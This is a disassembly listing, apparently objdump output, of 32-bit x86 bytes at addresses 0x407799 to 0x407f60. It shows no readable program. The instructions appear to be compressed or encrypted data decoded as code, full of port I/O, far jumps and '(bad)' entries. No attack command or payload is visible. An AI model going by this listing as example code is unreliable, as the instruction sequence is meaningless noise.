  407799:	in     al,0x9a
  40779b:	or     BYTE PTR [esi-0x59],ch
  40779e:	mov    cl,BYTE PTR [edi]
  4077a0:	or     DWORD PTR [edx],ecx
  4077a2:	mov    dh,0x53
  4077a4:	jge    0x4077ab
  4077a6:	dec    edx
  4077a7:	mov    edx,DWORD PTR ds:0xf7295d1a
  4077ad:	sbb    al,BYTE PTR [ebp+0x3e6c31c9]
  4077b3:	cmp    BYTE PTR [esi+ebx*1+0x5fa6d68d],dh
  4077ba:	pop    ds
  4077bb:	jnp    0x4077b5
  4077bd:	loopne 0x4077d4
  4077bf:	fwait
  4077c0:	lahf   
  4077c1:	jecxz  0x4077a1
  4077c3:	fiadd  WORD PTR [edx]
  4077c5:	dec    ecx
  4077c6:	out    dx,al
  4077c7:	jl     0x4077ab
  4077c9:	retf   
  4077ca:	mov    ebx,0x6fb3a210
  4077cf:	or     eax,DWORD PTR [ebx]
  4077d1:	adc    ecx,DWORD PTR [edx-0x60]
  4077d4:	inc    edi
  4077d5:	add    BYTE PTR [edi+0xe71e588],ch
  4077db:	push   edi
  4077dc:	sbb    eax,0x329ca768
  4077e1:	cmp    ah,BYTE PTR [eax]
  4077e3:	xchg   edi,eax
  4077e4:	inc    esp
  4077e5:	push   ebp
  4077e6:	sub    eax,0xa18bc483
  4077eb:	mov    WORD PTR [ebx-0x34cb33e5],?
  4077f1:	mov    esp,cs
  4077f3:	fcomp  QWORD PTR [edi+0xd1ebb62]
  4077f9:	adc    DWORD PTR [ebx-0x667a0cdd],ebx
  4077ff:	fwait
  407800:	cmp    ebp,0xffffffd2
  407803:	cmp    edi,DWORD PTR [esi]
  407805:	xchg   ebp,eax
  407806:	bnd jb 0x40782b
  407809:	push   esp
  40780a:	es jae 0x4077d8
  40780d:	fisttp DWORD PTR [edx+0x74b557d2]
  407813:	scas   al,BYTE PTR es:[edi]
  407814:	sar    DWORD PTR [edi+edx*1],0xeb
  407818:	fsub   st,st(5)
  40781a:	sbb    al,0xec
  40781c:	xchg   ebx,eax
  40781d:	push   es
  40781e:	sub    eax,0x9a85a38a
  407823:	fdivp  st(3),st
  407825:	out    0x70,al
  407827:	sub    al,bh
  407829:	popa   
  40782a:	push   edx
  40782b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40782c:	shr    DWORD PTR [ebx-0x1d],0xca
  407830:	and    eax,0xa8d2df86
  407835:	in     eax,0x5e
  407837:	mov    ah,0xbb
  407839:	dec    edx
  40783a:	sub    BYTE PTR [edx+0xb],cl
  40783d:	mov    DWORD PTR [eax-0x776a9f7e],0x11949b4d
  407847:	mov    al,0xc3
  407849:	xchg   esp,eax
  40784a:	jmp    0x4077ff
  40784c:	je     0x407840
  40784e:	test   eax,0xd003157
  407853:	mov    al,0xe9
  407855:	push   0xffffff85
  407857:	out    dx,al
  407858:	sbb    eax,0x46984e31
  40785d:	sar    BYTE PTR [esi-0x6b771238],1
  407863:	push   0x89785a17
  407868:	arpl   WORD PTR [edi-0x400fc816],si
  40786e:	mov    dl,0xc
  407870:	lock call 0x1d74:0x52bf2427
  407878:	out    dx,eax
  407879:	fcom   QWORD PTR [edx-0x1b74b932]
  40787f:	in     al,0x12
  407881:	dec    edi
  407882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407883:	xor    eax,0x98a805c8
  407888:	sbb    eax,0x44b3bc4
  40788d:	enter  0xfab,0xa5
  407891:	in     eax,dx
  407892:	add    DWORD PTR [ecx-0x126cca43],edx
  407898:	mov    al,0x62
  40789a:	gs sub eax,0x71025ad8
  4078a0:	into   
  4078a1:	in     al,dx
  4078a2:	and    eax,0x8f0fafe8
  4078a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078a8:	and    edx,DWORD PTR [edx+0x2c]
  4078ab:	push   esp
  4078ac:	sub    eax,0xf3b7d1f
  4078b1:	push   0xfe268c0f
  4078b6:	cmc    
  4078b7:	cld    
  4078b8:	push   cs
  4078b9:	mov    ch,0x7c
  4078bb:	test   DWORD PTR [ecx-0x24],ecx
  4078be:	pop    ebp
  4078bf:	push   cs
  4078c0:	xchg   BYTE PTR [edx*8+0x17d42876],ch
  4078c7:	mov    edi,DWORD PTR [edx]
  4078c9:	ret    
  4078ca:	pop    es
  4078cb:	lods   al,BYTE PTR ds:[esi]
  4078cc:	add    eax,0x26c04d57
  4078d2:	pushf  
  4078d3:	xchg   ecx,eax
  4078d4:	push   ss
  4078d5:	fbstp  TBYTE PTR [edx]
  4078d7:	jb     0x4078ce
  4078d9:	xor    al,0xa4
  4078db:	into   
  4078dc:	mov    edx,0x96a2b79a
  4078e1:	out    dx,eax
  4078e2:	iret   
  4078e3:	inc    esp
  4078e4:	cdq    
  4078e5:	cmp    eax,0x48d920a7
  4078ea:	test   BYTE PTR [edi+0x37],al
  4078ed:	scas   al,BYTE PTR es:[edi]
  4078ee:	pushf  
  4078ef:	test   eax,0x21004a59
  4078f4:	in     al,0x55
  4078f6:	mov    ch,0x9
  4078f8:	inc    edx
  4078f9:	sub    esp,DWORD PTR [edx-0x467b0409]
  4078ff:	rcr    BYTE PTR [edx+0x53],0x33
  407903:	cmp    DWORD PTR [eax-0x7665c838],esi
  407909:	inc    ecx
  40790a:	imul   esp,DWORD PTR [edx],0xae21b15a
  407910:	xchg   DWORD PTR [ebx],esi
  407912:	jnp    0x40790e
  407914:	jmp    DWORD PTR [ebp-0x2be5375c]
  40791a:	test   BYTE PTR [esi+0xc],ah
  40791d:	jg     0x40791a
  40791f:	mov    edx,DWORD PTR [ebx-0x4bf280f5]
  407925:	stos   DWORD PTR es:[edi],eax
  407926:	sub    BYTE PTR [edi+ecx*1+0x14a14329],dl
  40792d:	ret    0xf550
  407930:	xchg   ecx,eax
  407931:	mov    WORD PTR [esp+eiz*8+0x6e2dd9e1],?
  407938:	add    eax,0x3dc0cd33
  40793d:	int3   
  40793e:	and    DWORD PTR [eax+0x173f2125],esp
  407944:	mul    DWORD PTR [ebp+0x4c5bf2b2]
  40794a:	cmp    bl,dl
  40794c:	ret    
  40794d:	loop   0x4078f2
  40794f:	rcl    dh,cl
  407951:	push   esp
  407952:	xchg   ebp,eax
  407953:	mov    ebx,0x88e8aa7b
  407958:	cdq    
  407959:	fbstp  TBYTE PTR [edi-0x67]
  40795c:	jns    0x40793a
  40795e:	cli    
  40795f:	adc    BYTE PTR [edx-0x5f],dl
  407962:	jl     0x4078ef
  407964:	imul   BYTE PTR [ebx]
  407966:	jge    0x407947
  407968:	daa    
  407969:	fild   DWORD PTR [edi]
  40796b:	and    bl,BYTE PTR [ecx]
  40796d:	push   esp
  40796e:	jnp    0x407913
  407970:	or     eax,0x65fe0b2f
  407975:	sub    eax,0x9a1ca385
  40797a:	clc    
  40797b:	pusha  
  40797c:	rol    DWORD PTR [ecx+edi*8-0x611d14e3],cl
  407983:	jmp    0xd4e:0xc0b5035c
  40798a:	mov    ebp,0xabe71af3
  40798f:	pop    ebx
  407990:	push   eax
  407991:	mov    ah,0x92
  407993:	mov    ds:0x7d6b888c,eax
  407998:	int3   
  407999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40799a:	ins    DWORD PTR es:[edi],dx
  40799b:	add    eax,0xcd40c97d
  4079a0:	jl     0x40792d
  4079a2:	scas   al,BYTE PTR es:[edi]
  4079a3:	icebp  
  4079a4:	and    eax,0x880db8d4
  4079a9:	add    DWORD PTR [esi],0xffffffd6
  4079ac:	jb     0x40799f
  4079ae:	ret    
  4079af:	popa   
  4079b0:	out    dx,al
  4079b1:	fwait
  4079b2:	add    al,0xdf
  4079b4:	fldcw  WORD PTR [ecx+0x2e]
  4079b7:	xchg   BYTE PTR [edi],ah
  4079b9:	cmp    eax,0x1d14e905
  4079be:	and    BYTE PTR [edx+ecx*4-0x55e469fd],ch
  4079c5:	push   ds
  4079c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079c7:	jmp    DWORD PTR [ecx-0x4c]
  4079ca:	nop
  4079cb:	inc    esp
  4079cc:	inc    edi
  4079cd:	das    
  4079ce:	je     0x407954
  4079d0:	push   0x3e
  4079d2:	jecxz  0x407a2a
  4079d4:	stos   DWORD PTR es:[edi],eax
  4079d5:	dec    edi
  4079d6:	pop    ebx
  4079d7:	pop    edx
  4079d8:	pop    ecx
  4079d9:	in     al,0x3d
  4079db:	mov    ds:0x563aa9ec,eax
  4079e0:	mov    al,ds:0x8e1b0a2
  4079e5:	inc    ecx
  4079e6:	jle    0x407976
  4079e8:	sub    ebx,ebx
  4079ea:	shl    ebp,0xac
  4079ed:	and    al,0x23
  4079ef:	mov    ebp,0x4c9f704c
  4079f4:	popf   
  4079f5:	leave  
  4079f6:	sbb    BYTE PTR [ebx+esi*8+0x32b03649],bh
  4079fd:	inc    ebp
  4079fe:	xchg   DWORD PTR [ecx],edi
  407a00:	div    BYTE PTR [ebp+0x57ba857d]
  407a06:	dec    ebp
  407a07:	jecxz  0x407a0e
  407a09:	loopne 0x4079ec
  407a0b:	adc    ecx,ebx
  407a0d:	loop   0x4079b2
  407a0f:	gs pop ecx
  407a11:	scas   al,BYTE PTR es:[edi]
  407a12:	mov    ds:0xbf9b8fe6,al
  407a17:	add    bl,BYTE PTR [edi+eax*1-0x7d9cc075]
  407a1e:	xor    dl,BYTE PTR [esi-0x42]
  407a21:	in     al,0x28
  407a23:	test   eax,0xa5426d3c
  407a28:	mov    al,0xbb
  407a2a:	or     al,0x17
  407a2c:	retf   0x43a4
  407a2f:	cmp    eax,0x5a40b909
  407a34:	push   ebx
  407a35:	xchg   esi,eax
  407a36:	jge    0x407a9f
  407a38:	sub    ch,0x20
  407a3b:	out    dx,al
  407a3c:	add    BYTE PTR [ebp-0x45],dl
  407a3f:	cmp    eax,0xfba10899
  407a44:	sahf   
  407a45:	das    
  407a46:	pop    ss
  407a47:	retf   0xb743
  407a4a:	dec    ebp
  407a4b:	gs jl  0x407a2e
  407a4e:	mov    DWORD PTR ds:0x97b82706,esi
  407a54:	test   eax,0x45ec6082
  407a59:	jns    0x407ad1
  407a5b:	mov    eax,0x1a5c0fc6
  407a60:	cmp    BYTE PTR [eax+0xd],0xfb
  407a64:	popf   
  407a65:	xchg   edx,eax
  407a66:	fstp   st(5)
  407a68:	fs dec edi
  407a6a:	scas   al,BYTE PTR es:[edi]
  407a6b:	shl    BYTE PTR [ecx-0x58],1
  407a6e:	imul   esp,DWORD PTR [edx+eax*8+0x4579d35c],0x26
  407a76:	test   al,0xff
  407a78:	aad    0x44
  407a7a:	dec    ebp
  407a7b:	mov    dl,0x3d
  407a7d:	mov    al,0x2f
  407a7f:	push   ds
  407a80:	mov    bl,0xfe
  407a82:	pop    ebp
  407a83:	retf   0x7c7c
  407a86:	xchg   esp,eax
  407a87:	pop    es
  407a88:	adc    cl,bh
  407a8a:	loopne 0x407afd
  407a8c:	retf   
  407a8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a8e:	popf   
  407a8f:	push   esp
  407a90:	xchg   ecx,eax
  407a91:	sti    
  407a92:	test   al,0x97
  407a94:	sbb    eax,0x80c23a2d
  407a99:	addr16 mov esi,cs
  407a9c:	push   0x3f320d28
  407aa1:	out    0x34,eax
  407aa3:	es cs push ebp
  407aa6:	cmc    
  407aa7:	arpl   WORD PTR [edi-0x51],bx
  407aaa:	mov    bl,cl
  407aac:	iret   
  407aad:	mov    cl,0x90
  407aaf:	mov    BYTE PTR [esi+0x49],ch
  407ab2:	pop    eax
  407ab3:	adc    ecx,DWORD PTR [esi]
  407ab5:	setae  BYTE PTR [edi*2+0x155a2547]
  407abd:	push   cs
  407abe:	jmp    0xfdc0:0x841d2f07
  407ac5:	pop    es
  407ac6:	push   ds
  407ac7:	dec    ebp
  407ac8:	push   es
  407ac9:	mov    bh,ah
  407acb:	and    DWORD PTR [edx],edi
  407acd:	in     eax,0x7f
  407acf:	pop    es
  407ad0:	xchg   ecx,eax
  407ad1:	mov    ebx,0x20224891
  407ad6:	push   0xc19bbe1a
  407adb:	xchg   esi,eax
  407adc:	push   edi
  407add:	add    esp,DWORD PTR [ecx]
  407adf:	adc    BYTE PTR [edx+edi*2],dh
  407ae2:	dec    ecx
  407ae3:	ins    BYTE PTR es:[edi],dx
  407ae4:	popa   
  407ae5:	fmulp  st(0),st
  407ae7:	jno    0x407b66
  407ae9:	jle    0x407ac0
  407aeb:	sbb    al,0xdf
  407aed:	dec    ecx
  407aee:	jne    0x407ad2
  407af0:	pusha  
  407af1:	fdiv   QWORD PTR [esi]
  407af3:	mov    es,WORD PTR [ebp-0x6250b79f]
  407af9:	cmp    eax,0x43cbc0f
  407afe:	mov    ebp,edx
  407b00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b01:	ret    
  407b02:	cmp    bl,BYTE PTR [ecx-0x79cf2b96]
  407b08:	pop    ss
  407b09:	jle    0x407b1a
  407b0b:	push   esi
  407b0c:	jo     0x407b33
  407b0e:	xor    DWORD PTR [ebx],edx
  407b10:	dec    ebp
  407b11:	je     0x407aba
  407b13:	stc    
  407b14:	and    edx,ebx
  407b16:	sbb    BYTE PTR [eax+0x498d161d],dl
  407b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b1d:	test   DWORD PTR [ecx+0x5ec14859],eax
  407b23:	push   ecx
  407b24:	or     BYTE PTR [ecx+0x4e],cl
  407b27:	nop
  407b28:	and    BYTE PTR [ebp+0x6fb31d86],cl
  407b2e:	stos   DWORD PTR es:[edi],eax
  407b2f:	les    esi,FWORD PTR [ebx+eiz*1-0x7688408]
  407b36:	pop    ecx
  407b37:	sbb    DWORD PTR [esi-0x32],esp
  407b3a:	pusha  
  407b3b:	call   0x73d9:0x27116d54
  407b42:	sub    dl,cl
  407b44:	icebp  
  407b45:	dec    esi
  407b46:	or     DWORD PTR [ebx-0x5392c7aa],esp
  407b4c:	push   ecx
  407b4d:	dec    esi
  407b4e:	inc    edx
  407b4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b50:	ficomp DWORD PTR [edi]
  407b52:	sub    BYTE PTR [bx+di+0x7a],cl
  407b56:	jg     0x407b7c
  407b58:	sti    
  407b59:	xchg   edx,eax
  407b5a:	pop    eax
  407b5b:	call   0xa6f37a31
  407b60:	arpl   WORD PTR [ebp+edi*1+0x7f],ax
  407b64:	pusha  
  407b65:	in     al,dx
  407b66:	cmc    
  407b67:	aas    
  407b68:	dec    ebx
  407b69:	aad    0x72
  407b6b:	retf   
  407b6c:	dec    esi
  407b6d:	cmp    BYTE PTR cs:0x9a22bb6e,0xa5
  407b75:	inc    ebx
  407b76:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  407b78:	push   es
  407b79:	push   0x22bf8f9
  407b7e:	or     ebx,ebx
  407b80:	dec    eax
  407b81:	adc    edi,0x2c
  407b84:	in     al,dx
  407b85:	retf   
  407b86:	xchg   ebp,eax
  407b87:	mov    esi,0x168899e1
  407b8c:	xchg   esi,eax
  407b8d:	xchg   ebx,eax
  407b8e:	fld    QWORD PTR [eax+0xd1af5ba]
  407b94:	mov    al,ch
  407b96:	nop
  407b97:	and    ch,BYTE PTR [ebx+0x22865235]
  407b9d:	shl    DWORD PTR [edi+esi*2-0xa],0x84
  407ba2:	jb     0x407b6f
  407ba4:	dec    ebx
  407ba5:	inc    ebp
  407ba6:	jo     0x407bed
  407ba8:	std    
  407ba9:	push   ss
  407baa:	jns    0x407b72
  407bac:	or     esp,DWORD PTR [edi+0x461e0af4]
  407bb2:	mov    gs,WORD PTR [ebx]
  407bb4:	xchg   BYTE PTR [esi+0x4a],dl
  407bb7:	pop    ebp
  407bb8:	sub    edi,edi
  407bba:	push   ss
  407bbb:	gs pusha 
  407bbd:	and    eax,0xc61f3d78
  407bc2:	pop    ebx
  407bc3:	rol    DWORD PTR [ebp+0x41],cl
  407bc6:	test   DWORD PTR [eax],edi
  407bc8:	adc    al,BYTE PTR [edx]
  407bca:	mov    ebx,0x8e019db7
  407bcf:	into   
  407bd0:	mov    ah,0x50
  407bd2:	mov    ebp,0x7cf1634e
  407bd7:	lea    ecx,ds:0xebcd8268
  407bdd:	cli    
  407bde:	fucomip st,st(1)
  407be0:	pop    ebx
  407be1:	dec    esp
  407be2:	je     0x407c11
  407be4:	ins    DWORD PTR es:[edi],dx
  407be5:	jnp    0x407c57
  407be7:	fimul  WORD PTR [esi]
  407be9:	jp     0x407c1f
  407beb:	mov    bl,0x3e
  407bed:	mov    esi,0x128b9f6e
  407bf2:	rcr    DWORD PTR [esi+0x5e],1
  407bf5:	jp     0x407bca
  407bf7:	cmp    esp,DWORD PTR [edi+0x56]
  407bfa:	bound  edi,QWORD PTR [eax+0x41]
  407bfd:	jge    0x407c0c
  407bff:	push   0xffffffc3
  407c01:	fsub   QWORD PTR [eax+ecx*2-0x6d10e670]
  407c08:	jae    0x407bfd
  407c0a:	into   
  407c0b:	cmc    
  407c0c:	sti    
  407c0d:	pop    ds
  407c0e:	lods   eax,DWORD PTR ds:[esi]
  407c0f:	js     0x407c50
  407c11:	mov    edi,0x68ea0f8d
  407c16:	adc    eax,0xd8ee2f13
  407c1b:	push   esp
  407c1c:	mul    DWORD PTR ds:[ebx-0x3e]
  407c20:	lods   al,BYTE PTR ds:[esi]
  407c21:	pop    es
  407c22:	xchg   BYTE PTR [edi],cl
  407c24:	lds    esi,FWORD PTR [ebp-0x36]
  407c27:	xchg   ebx,esi
  407c29:	sub    eax,0x8a34d86c
  407c2e:	add    DWORD PTR [eax+ebx*4-0x5f3cea25],esi
  407c35:	mov    BYTE PTR [edi-0x292ba0ad],al
  407c3b:	nop    DWORD PTR [edi+edi*8+0x9]
  407c40:	inc    edi
  407c41:	aam    0xcb
  407c43:	jl     0x407c65
  407c45:	shr    DWORD PTR [eax-0x61],0x26
  407c49:	inc    ebx
  407c4a:	stos   BYTE PTR es:[edi],al
  407c4b:	push   0x25
  407c4d:	imul   edi,DWORD PTR [ebx+0x4b12f498],0x1f50806d
  407c57:	imul   esi,ebp,0x2d
  407c5a:	push   eax
  407c5b:	ss push esi
  407c5d:	push   eax
  407c5e:	lea    edi,[eax+edi*4]
  407c61:	or     ch,BYTE PTR [ebx+0x705d7198]
  407c67:	in     eax,0x45
  407c69:	icebp  
  407c6a:	dec    esi
  407c6b:	jmp    DWORD PTR [ebx+0x17]
  407c6e:	mov    edx,0x117f2eb1
  407c73:	lods   eax,DWORD PTR ds:[esi]
  407c74:	jmp    0x1c48:0x805da992
  407c7b:	jge    0x407c2c
  407c7d:	mov    ds,eax
  407c7f:	imul   edx,eax,0x7f
  407c82:	and    dl,BYTE PTR [edx-0x58]
  407c85:	das    
  407c86:	lahf   
  407c87:	inc    edi
  407c88:	add    al,0xcb
  407c8a:	xor    al,0x62
  407c8c:	loopne 0x407c23
  407c8e:	rol    BYTE PTR [ebx-0x4b],cl
  407c91:	scas   eax,DWORD PTR es:[edi]
  407c92:	cmp    eax,0xa000a5ff
  407c97:	scas   al,BYTE PTR es:[edi]
  407c98:	sbb    eax,0xf8b76364
  407c9d:	xchg   ebx,eax
  407c9e:	repz test al,0xb9
  407ca1:	sbb    eax,0xce476245
  407ca6:	test   eax,0x42a1c8
  407cab:	(bad)  
  407cac:	and    edx,DWORD PTR [ecx+0x7dce190e]
  407cb2:	adc    cl,dl
  407cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cb5:	imul   ebp,DWORD PTR [ecx+0x1b],0x7a04052b
  407cbc:	or     ch,bh
  407cbe:	pop    edx
  407cbf:	fild   WORD PTR [edi-0x3838fca8]
  407cc5:	cli    
  407cc6:	mov    al,0x3a
  407cc8:	retf   0xb03a
  407ccb:	xchg   esi,eax
  407ccc:	outs   dx,BYTE PTR ds:[esi]
  407ccd:	cs pop ss
  407ccf:	popa   
  407cd0:	jmp    0x407cbc
  407cd2:	outs   dx,BYTE PTR ds:[esi]
  407cd3:	daa    
  407cd4:	adc    ch,BYTE PTR [esi+0x3eb5af72]
  407cda:	pop    edx
  407cdb:	pop    eax
  407cdc:	pusha  
  407cdd:	inc    esi
  407cde:	push   eax
  407cdf:	inc    ebp
  407ce0:	inc    ebp
  407ce1:	mov    ds:0x7713a09e,eax
  407ce6:	push   cs
  407ce7:	inc    eax
  407ce8:	push   edx
  407ce9:	retf   
  407cea:	xchg   ecx,ecx
  407cec:	test   BYTE PTR [edx+ecx*4-0x17399f43],cl
  407cf3:	repz mov ah,0x29
  407cf6:	in     eax,0xa4
  407cf8:	fisttp QWORD PTR [ebx]
  407cfa:	cld    
  407cfb:	out    dx,eax
  407cfc:	imul   edi,esi,0x28
  407cff:	inc    edx
  407d00:	aam    0xf7
  407d02:	push   ecx
  407d03:	jns    0x407d19
  407d05:	jg     0x407cc0
  407d07:	mov    ecx,0x6e4ff8f
  407d0c:	imul   ecx,esp,0x10
  407d0f:	mov    al,ds:0xaa4d193b
  407d14:	retf   
  407d15:	adc    eax,0xeba32ea2
  407d1a:	repz pop es
  407d1c:	add    ch,bh
  407d1e:	dec    ebp
  407d1f:	or     ecx,DWORD PTR [eax]
  407d21:	call   0x95ab4546
  407d26:	jecxz  0x407cee
  407d28:	cld    
  407d29:	push   0x8
  407d2b:	sti    
  407d2c:	pop    eax
  407d2d:	push   ebx
  407d2e:	sahf   
  407d2f:	cmc    
  407d30:	pop    esp
  407d31:	pop    es
  407d32:	push   0x6f64750d
  407d37:	jbe    0x407d6c
  407d39:	xchg   BYTE PTR [ecx],bl
  407d3b:	imul   esp,DWORD PTR [esi],0xffffffbc
  407d3e:	in     eax,dx
  407d3f:	ss push esi
  407d41:	enter  0x27f8,0x82
  407d45:	int3   
  407d46:	add    DWORD PTR [esi+0x417e37dc],0x41
  407d4d:	adc    edi,eax
  407d4f:	and    dl,al
  407d51:	cmp    eax,0x46f712cc
  407d56:	pop    ss
  407d57:	xchg   ebp,eax
  407d58:	popa   
  407d59:	jge    0x407dba
  407d5b:	mov    dh,0x2c
  407d5d:	sub    bl,BYTE PTR [ebp+0x1d51fe8a]
  407d63:	lock mov ch,0x47
  407d66:	test   al,0xfb
  407d68:	pop    edx
  407d69:	adc    cl,ch
  407d6b:	or     al,0xdb
  407d6d:	dec    eax
  407d6e:	ss or  ebp,edi
  407d71:	gs mov edx,0x37940853
  407d77:	iret   
  407d78:	loopne 0x407d06
  407d7a:	(bad)  
  407d7c:	add    eax,0x703f8d69
  407d81:	cmp    al,0x16
  407d83:	adc    dh,BYTE PTR [eax-0xd66ac45]
  407d89:	mov    ah,0xd9
  407d8b:	(bad)  
  407d8c:	cdq    
  407d8d:	in     eax,dx
  407d8e:	iret   
  407d8f:	test   DWORD PTR [eax-0x39b0571a],eax
  407d95:	imul   esp,DWORD PTR [eax-0x674fbc6f],0x730c36a0
  407d9f:	popf   
  407da0:	je     0x407d7b
  407da2:	pop    ebp
  407da3:	out    dx,eax
  407da4:	xor    eax,0xf80f7d4a
  407da9:	fs cdq 
  407dab:	js     0x407df6
  407dad:	imul   ebx,DWORD PTR [esi],0x4f3f8b60
  407db3:	adc    dh,BYTE PTR [edi+eiz*1]
  407db6:	ret    0x4c2e
  407db9:	inc    ebp
  407dba:	mov    ah,0xaf
  407dbc:	cs pop ss
  407dbe:	jmp    0x57201f
  407dc3:	sbb    BYTE PTR [ecx+0x3],bl
  407dc6:	arpl   bx,bx
  407dc8:	push   ebx
  407dc9:	fimul  DWORD PTR [eax+0x39]
  407dcc:	adc    BYTE PTR [ecx],dh
  407dce:	pop    ebp
  407dcf:	shr    BYTE PTR [ebx],cl
  407dd1:	mov    ch,ch
  407dd3:	imul   DWORD PTR [esi-0x7507473c]
  407dd9:	lock mov esp,0x5a0ff68b
  407ddf:	shr    DWORD PTR [edx],1
  407de1:	enter  0xfc59,0xd8
  407de5:	inc    edx
  407de6:	fdiv   st(6),st
  407de8:	push   edi
  407de9:	inc    BYTE PTR [esi-0x22]
  407dec:	mov    esp,0xf482b1c7
  407df1:	out    0x53,eax
  407df3:	pop    edx
  407df4:	adc    cl,BYTE PTR [eax-0x21]
  407df7:	mov    ebp,0xc7b9bcdc
  407dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dfd:	push   0x31
  407dff:	sbb    dl,cl
  407e01:	cmc    
  407e02:	xor    DWORD PTR [edi-0x3b],esp
  407e05:	add    DWORD PTR [edi],ecx
  407e07:	inc    edi
  407e08:	cld    
  407e09:	adc    DWORD PTR [ebx],ebp
  407e0b:	fdivr  DWORD PTR [edi]
  407e0d:	and    DWORD PTR [edi-0x51],ecx
  407e10:	test   DWORD PTR [ecx],0x40534ce6
  407e16:	(bad)  
  407e17:	jae    0x407daa
  407e19:	in     al,0xb8
  407e1b:	sbb    esp,DWORD PTR [edi+0x6a29a755]
  407e21:	mov    ecx,0x9f1154c5
  407e26:	pop    ss
  407e27:	xor    cl,BYTE PTR [ebx-0x6cd7fb12]
  407e2d:	mov    ch,0x8f
  407e2f:	ficom  WORD PTR [ecx]
  407e31:	jle    0x407dfb
  407e33:	rcr    BYTE PTR [eax-0x38],1
  407e36:	pop    eax
  407e37:	add    al,0x75
  407e39:	lods   eax,DWORD PTR ds:[esi]
  407e3a:	das    
  407e3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e3c:	hlt    
  407e3d:	cs arpl di,bp
  407e40:	loopne 0x407e4a
  407e42:	or     DWORD PTR [edi+0x2b],edi
  407e45:	mov    ebx,DWORD PTR [esi+eiz*1+0x20]
  407e49:	out    dx,eax
  407e4a:	sbb    al,0xb5
  407e4c:	out    dx,eax
  407e4d:	sbb    BYTE PTR [edx],0x1f
  407e50:	push   es
  407e51:	and    BYTE PTR [edx-0x1f],dh
  407e54:	mov    bh,BYTE PTR [eax+0x6ad04c14]
  407e5a:	add    BYTE PTR [ecx-0x15554e9b],dh
  407e60:	loop   0x407de5
  407e62:	sub    ebx,ecx
  407e64:	mov    ebx,eax
  407e66:	jae    0x407ecc
  407e68:	xchg   edi,eax
  407e69:	sub    al,0x8e
  407e6b:	push   0xab7a524
  407e70:	and    BYTE PTR [eax],bh
  407e72:	pop    ebx
  407e73:	enter  0x680b,0x3c
  407e77:	dec    edx
  407e78:	sub    eax,0xb07951c2
  407e7d:	rol    DWORD PTR [eax+0x5e],1
  407e80:	lods   al,BYTE PTR ds:[esi]
  407e81:	hlt    
  407e82:	sbb    eax,0xeff382f8
  407e87:	mov    ebx,esp
  407e89:	inc    ecx
  407e8a:	pop    esi
  407e8b:	(bad)  
  407e8c:	iret   
  407e8d:	das    
  407e8e:	test   BYTE PTR [edi-0x11551297],al
  407e94:	push   ds
  407e95:	mov    ebx,0xa0731c2d
  407e9a:	enter  0xd0f5,0xfd
  407e9e:	fdiv   QWORD PTR [ecx+0x7db97ea3]
  407ea4:	ins    DWORD PTR es:[edi],dx
  407ea5:	retf   
  407ea6:	dec    ebx
  407ea7:	fidivr WORD PTR [eax+0x6035c2e6]
  407ead:	in     eax,dx
  407eae:	loope  0x407e45
  407eb0:	data16 aam 0x28
  407eb3:	cdq    
  407eb4:	cwde   
  407eb5:	sbb    BYTE PTR [ebp-0x123041bb],0x54
  407ebc:	test   al,0x50
  407ebe:	int    0x21
  407ec0:	xchg   edx,eax
  407ec1:	lods   al,BYTE PTR ds:[esi]
  407ec2:	inc    edi
  407ec3:	or     ecx,esp
  407ec5:	sub    BYTE PTR [esi-0x70],bh
  407ec8:	push   0xe794ff82
  407ecd:	in     eax,dx
  407ece:	std    
  407ecf:	sub    DWORD PTR [ecx],ecx
  407ed1:	in     al,dx
  407ed2:	push   edx
  407ed3:	aaa    
  407ed4:	push   esi
  407ed5:	out    dx,al
  407ed6:	pop    ebx
  407ed7:	inc    edi
  407ed8:	and    esp,esp
  407eda:	bound  edi,QWORD PTR [esi-0x1626fe]
  407ee0:	push   ecx
  407ee1:	stos   BYTE PTR es:[edi],al
  407ee2:	dec    edx
  407ee3:	sahf   
  407ee4:	inc    edx
  407ee5:	ss inc esp
  407ee7:	inc    esp
  407ee8:	adc    al,0x63
  407eea:	dec    edi
  407eeb:	push   edi
  407eec:	jmp    0xd808:0x594d04fa
  407ef3:	sahf   
  407ef4:	ss push edi
  407ef6:	sar    DWORD PTR es:[ebx-0x662213d0],cl
  407efd:	dec    ecx
  407efe:	(bad)  
  407eff:	out    dx,al
  407f00:	inc    esi
  407f01:	les    esp,FWORD PTR ds:0xba1766f5
  407f07:	out    0xad,al
  407f09:	pop    edi
  407f0a:	int3   
  407f0b:	jo     0x407eb7
  407f0d:	mov    esi,0x919f5cc8
  407f12:	adc    bl,BYTE PTR [ebp-0x6]
  407f15:	jl     0x407f2d
  407f17:	rol    BYTE PTR [ebx],cl
  407f19:	mov    edi,0xb573a410
  407f1e:	sub    dh,BYTE PTR [esi+0x1ce16f6b]
  407f24:	xlat   BYTE PTR cs:[ebx]
  407f26:	mov    dl,0x94
  407f28:	test   eax,0xa622128c
  407f2d:	ins    DWORD PTR es:[edi],dx
  407f2e:	pop    esi
  407f2f:	shl    DWORD PTR [edx-0x7f4e0604],1
  407f35:	movsx  ebx,ch
  407f38:	cmp    edi,ebx
  407f3a:	stos   BYTE PTR es:[edi],al
  407f3b:	cli    
  407f3c:	gs sub al,0xb
  407f3f:	inc    ax
  407f41:	push   ss
  407f42:	mov    cl,0x98
  407f44:	gs mov esi,0x4119f0ea
  407f4a:	(bad)  
  407f4b:	jmp    0x2c10:0x91d1cb7e
  407f52:	pop    eax
  407f53:	sbb    eax,0x8c29c142
  407f58:	stos   DWORD PTR es:[edi],eax
  407f59:	pop    edi
  407f5a:	mov    al,0x10
  407f5c:	repz imul ebx,DWORD PTR [ecx],0xffffffce
  407f60:	or     DWORD PTR [esi],eax
